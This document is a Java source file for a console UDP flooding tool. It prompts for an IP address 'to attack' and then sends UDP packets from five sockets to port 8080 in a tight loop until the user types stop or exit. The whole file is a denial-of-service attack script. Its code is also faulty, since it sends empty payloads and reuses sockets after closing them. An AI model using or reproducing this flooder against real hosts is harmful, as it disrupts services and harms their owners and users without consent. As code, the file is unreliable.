/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package udp_attack;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Scanner;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author sooryagangarajk
 */
public class UDP_ATTACK {

    /**
     * @param args the command line arguments
     */
    public static boolean stop = false;
    public static boolean exit = false;
    public static boolean ipMode = false;

    public static void main(String[] args) throws SocketException, UnknownHostException {

        String ch = "";
        for (int i = 0; i < 10; i++) {
            ch = ch + ch;
        }

        DatagramSocket skt = new DatagramSocket(8120);
        DatagramSocket skt1 = new DatagramSocket(5545);
        DatagramSocket skt2 = new DatagramSocket(5546);
        DatagramSocket skt3 = new DatagramSocket(5547);
        DatagramSocket skt4 = new DatagramSocket(5548);

        while (!exit) {
            stop = false;
            System.out.println("Enter the ip address to attack:");
            Scanner input = new Scanner(System.in);
            String ip = input.next();
            if (ip.contains("exit")) {
                exit = true;
                stop = true;
            }

            InetAddress Hostip = InetAddress.getByName(ip);
            byte[] sending = ch.getBytes();
            DatagramPacket replay = new DatagramPacket(sending, sending.length, Hostip, 8080);

            Thread t1 = new Thread(new Runnable() {
                @Override
                public void run() {
                    Scanner input = new Scanner(System.in);
                    
                    while (true) {

                        //System.out.println("Do you want to stop?");
                        String temp = input.next();
                        if (temp.contains("stop")) {
                            stop = true;
                            break;
                        }
                        if (temp.contains("exit")) {
                            exit = true;
                            stop = true;
                            break;
                        }

                    }
                }
            });
            t1.start();

            System.out.println("Attack started");
            while (true) {
                try {
                    if (!stop) {

                        skt.send(replay);
                        skt1.send(replay);
                        skt2.send(replay);
                        skt3.send(replay);
                        skt4.send(replay);
                    } else {
                        break;
                    }
                } catch (IOException ex) {

                }
            }
            skt.close();
            skt1.close();
            skt2.close();
            skt3.close();
            skt4.close();
            t1.stop();

        }
    }

}
